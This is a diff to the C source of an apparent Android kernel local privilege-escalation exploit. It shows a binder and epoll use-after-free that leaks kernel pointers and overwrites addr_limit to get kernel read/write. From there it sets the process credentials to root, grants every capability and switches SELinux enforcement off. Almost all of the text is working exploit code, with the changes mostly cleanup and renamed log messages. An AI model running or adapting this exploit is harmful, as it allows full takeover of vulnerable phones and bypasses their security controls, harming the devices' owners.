@@ -101,6 +101,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
   int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
   char* dummyBuffer = malloc(dummyBufferSize);
   if (dummyBuffer == NULL) err(1, "allocating dummyBuffer");
+  
   memset(dummyBuffer, 0, dummyBufferSize);
   
   printf("PARENT: clobbering at 0x%lx\n", payloadAddress);
@@ -144,11 +145,10 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
   iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = sizeof(testDatum);
   int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
  
-  int socks[2];
-  //if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
-  pipe(socks);
-  if ((fcntl(socks[0], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
-  if ((fcntl(socks[1], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
+  int pipes[2];
+  pipe(pipes);
+  if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
+  if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE) err(1, "pipe size");
 
   pid_t fork_ret = fork();
   if (fork_ret == -1) err(1, "fork");
@@ -162,7 +162,7 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     
     char* f = malloc(totalLength); 
     if (f == NULL) err(1,"Allocating memory");
-    memset(f,'-',paddingSize+UAF_SPINLOCK);
+    memset(f,0,paddingSize+UAF_SPINLOCK);
     unsigned long pos = paddingSize+UAF_SPINLOCK;
     memcpy(f+pos,second_write_chunk,sizeof(second_write_chunk));
     pos += sizeof(second_write_chunk);
@@ -170,36 +170,26 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     pos += payloadLength;
     memcpy(f+pos,&testValue,sizeof(testDatum));
     pos += sizeof(testDatum);
-    write(socks[1], f, pos);
+    write(pipes[1], f, pos);
     printf("CHILD: wrote %lu\n", pos);
-    close(socks[1]);
-    close(socks[0]);
+    close(pipes[1]);
+    close(pipes[0]);
     exit(0);
   }
-  ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
-  struct msghdr msg = {
-    .msg_iov = iovec_array,
-    .msg_iovlen = IOVEC_ARRAY_SZ
-  };
-  int recvmsg_result = readv(socks[0], iovec_array, IOVEC_ARRAY_SZ); // recvmsg(socks[0], &msg, MSG_WAITALL);
-/*  struct mmsghdr mmsg;
-  mmsg.msg_hdr.msg_iov = iovec_array;
-  mmsg.msg_hdr.msg_iovlen = IOVEC_ARRAY_SZ;
-  mmsg.msg_len = totalLength;
-    struct timespec timeout;
-    timeout.tv_sec = 10;
-    timeout.tv_nsec = 0;
-    int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */
 
-    printf("PARENT: testDatum = %lx\n", testDatum);
-    if (testDatum != testValue)
+   ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+   int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ); 
+
+    printf("PARENT: readv returns %d, expected %d\n", b, totalLength);
+
+   if (testDatum != testValue)
         errx(1, "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
-    //hexdump_memory(dummyBuffer, 16);
-    //hexdump_memory(dummyBuffer+UAF_SPINLOCK-16, 16);
+    else
+        printf("PARENT: Clobbering test passed.");
   
-  printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
-      totalLength);
    free(dummyBuffer);
+   close(pipes[0]);
+   close(pipes[1]);
    
    return testDatum != testValue;
 }
@@ -261,7 +251,7 @@ void leak_data(void* leakBuffer, int leakAmount,
     printf("CHILD: Finished EPOLL_CTL_DEL.\n");
 
     unsigned long size1 = paddingSize+UAF_SPINLOCK+minimumLeak;
-    printf("CHILD: initial %lx\n", size1);
+    printf("CHILD: initial portion length 0x%lx\n", size1);
     char buffer[size1];
     memset(buffer, 0, size1);
     if (read(pipefd[0], buffer, size1) != size1) err(1, "reading first part of pipe");
@@ -285,7 +275,7 @@ void leak_data(void* leakBuffer, int leakAmount,
             task_struct_ptr+8,
             8
         };
-        printf("CHILD: clobbering with extra leak address %lx at %lx\n", (unsigned long)extraLeakAddress, addr);
+        printf("CHILD: clobbering with extra leak structures\n");
         clobber_data(addr, &extra, sizeof(extra)); 
         printf("CHILD: clobbered\n");
     }
@@ -293,7 +283,6 @@ void leak_data(void* leakBuffer, int leakAmount,
     if(read(pipefd[0], dataBuffer+minimumLeak, adjLeakAmount-minimumLeak) != adjLeakAmount-minimumLeak) err(1, "leaking");
     
     write(leakPipe[1], dataBuffer, adjLeakAmount);
-    //hexdump_memory(dataBuffer, adjLeakAmount);
     
     if (extraLeakAmount > 0) {
         printf("CHILD: extra leak\n");
@@ -307,7 +296,10 @@ void leak_data(void* leakBuffer, int leakAmount,
         write(leakPipe[1], dataBuffer, 8);
     }
         
+    close(pipefd[0]);
     close(pipefd[1]);
+    close(leakPipe[0]);
+    close(leakPipe[1]);
     printf("CHILD: Finished write to FIFO.\n");
     exit(0);
   }
@@ -317,8 +309,8 @@ void leak_data(void* leakBuffer, int leakAmount,
   printf("PARENT: writev() returns 0x%x\n", (unsigned int)b);
   if (b != totalLength) 
         errx(1, "writev() returned wrong value: needed 0x%lx", totalLength);
-  // leaked data
-  printf("PARENT: Reading leaked data\n");
+
+    printf("PARENT: Reading leaked data\n");
   
   b = read(leakPipe[0], dataBuffer, adjLeakAmount);
   if (b != adjLeakAmount) errx(1, "reading leak: read 0x%x needed 0x%lx", b, adjLeakAmount);
@@ -338,6 +330,11 @@ void leak_data(void* leakBuffer, int leakAmount,
 
   if (task_struct_ptr_p != NULL)
       memcpy(task_struct_ptr_p, dataBuffer+TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);
+  
+  close(pipefd[0]);
+  close(pipefd[1]);
+  close(leakPipe[0]);
+  close(leakPipe[1]);
   
   int status;
   wait(&status);
@@ -417,14 +414,7 @@ void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
 #define OFFSET__cred__security      0x078
 #define OFFSET__cred__user_ns       0x088
 
-//#define OFFSET__task_struct__mm 0x520
-//#define OFFSET__mm_struct__user_ns 0x300
-//#define OFFSET__uts_namespace__name__version 0xc7
-// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
-//#define SYMBOL__init_user_ns 0x202f2c8
-//#define SYMBOL__init_task 0x20257d0
-//#define SYMBOL__init_uts_ns 0x20255c0
-
+// Make the kallsyms module not check for permission to list symbol addresses
 int fixKallsymsFormatStrings(unsigned long start) {
   int found = 0;
   
@@ -533,48 +523,31 @@ int main(int argc, char** argv) {
   unsigned long kstack = 0xDEADBEEFDEADBEEFul;
   unsigned long task_struct_ptr = 0xDEADBEEFDEADBEEFul;
   leak_data(NULL, 0, 0, NULL, 0, &task_struct_ptr, &kstack);
-  printf("task_struct_ptr = %lx\n", (unsigned long)task_struct_ptr);
-  printf("stack = %lx\n", kstack);
-  printf("Clobbering addr_limit\n");
+  printf("MAIN: task_struct_ptr = %lx\n", (unsigned long)task_struct_ptr);
+  printf("MAIN: stack = %lx\n", kstack);
+  printf("MAIN: Clobbering addr_limit\n");
   unsigned long const src=0xFFFFFFFFFFFFFFFEul;
   clobber_data(kstack+8, &src, 8);
   
-  printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
+  printf("MAIN: current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
   
-  //char task_struct_data[0x900];
-  //kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
-  //printf("task_struct\n");
-  //hexdump_memory(task_struct_data, sizeof(task_struct_data)); 
-
   unsigned long thread_info_ptr = kstack;
 
   setbuf(stdout, NULL);
-  printf("should have stable kernel R/W now\n");
+  printf("MAIN: should have stable kernel R/W now\n");
 
-
-  /*
-  unsigned long mm_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__mm);
-  char mm_data[0x1000];
-  kernel_read(mm_ptr, mm_data, sizeof(mm_data));
-  printf("mm\n");
-  hexdump_memory(mm_data, sizeof(mm_data)); */
-  
-  printf("cred\n");
+  printf("MAIN: setting root credentials\n");
   unsigned long cred_ptr = kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__cred);
-  /*
-  char cred_data[0x200];
-  kernel_read(cred_ptr, cred_data, sizeof(cred_data));
-  hexdump_memory(cred_data, sizeof(cred_data));  */
   
   for (int i = 0; i < 8; i++)
     kernel_write_uint(cred_ptr+OFFSET__cred__uid + i*4, 0);
 
-  if (getuid() != 0) {
-    printf("MAIN: Error changing UIDs to 0.\n");
-    exit(1);
-  }
+  if (getuid() != 0) 
+      err(1, "changing UIDs to 0\n");
   
   printf("MAIN: UID = 0\n");  
+  
+  printf("MAIN: enabling capabilities\n");
   
   // reset securebits
   kernel_write_uint(cred_ptr+OFFSET__cred__securebits, 0);
@@ -584,12 +557,6 @@ int main(int argc, char** argv) {
   kernel_write_ulong(cred_ptr+OFFSET__cred__cap_effective, 0x3fffffffffUL);
   kernel_write_ulong(cred_ptr+OFFSET__cred__cap_bset, 0x3fffffffffUL);
   //kernel_write_ulong(cred_ptr+OFFSET__cred__cap_ambient, 0x3fffffffffUL);
-  
-  printf("MAIN: enabled capabilities\n");
-  
-/*  FILE* f = fopen("/proc/kallsyms", "r");
-  char line[1024];
-  while(NULL != (fgets(line, 1024, f))) puts(line); */
   
   unsigned long user_ns = kernel_read_ulong(cred_ptr+OFFSET__cred__user_ns);
   printf("MAIN: user_ns = %lx\n", user_ns);
@@ -603,20 +570,10 @@ int main(int argc, char** argv) {
   }
   printf("MAIN: SECCOMP status %d\n", prctl(PR_GET_SECCOMP));
   
-  /*
-  unsigned long pk1 = 0xffffffc001403b70+0x888; // FFFFFFC0014043F8
-  unsigned long pk2 = 0xffffffc001403b70+0x898; // FFFF FFC0 0140 4408
-  
-  // enable kallsyms
-  kernel_write_uchar(pk1+2, ' ');
-  kernel_write_uchar(pk2+2, ' ');
-  
-  unsigned long selinuxenforcing = 0xffffffc0019eea94; */
-  
-  printf("searching for selinux_enforcing\n");
+  printf("MAIN: searching for selinux_enforcing\n");
   unsigned long selinux_enforcing = findSymbol(user_ns, "selinux_enforcing");
   if (selinux_enforcing == 0)
-      printf("MAIN: **FAIL** cannot disable selinux enforcing\n");
+      printf("MAIN: **FAIL** cannot find selinux_enforcing symbol\n");
   else {
       printf("MAIN: found selinux_enforcing at %lx\n", selinux_enforcing);
       kernel_write_uint(selinux_enforcing, 0);
